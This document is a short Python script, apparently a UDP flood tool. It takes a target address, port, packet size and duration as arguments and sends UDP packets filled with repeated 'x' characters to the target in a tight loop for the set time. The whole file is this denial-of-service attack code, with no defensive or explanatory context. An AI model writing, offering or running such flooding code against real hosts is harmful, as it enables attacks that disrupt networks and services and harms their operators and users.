import sys
import time
import socket
target = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
att_time = int(sys.argv[4])
start_time = time.time()

while time.time() < start_time+att_time:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto("x"*size, (target, port))
    s.close()
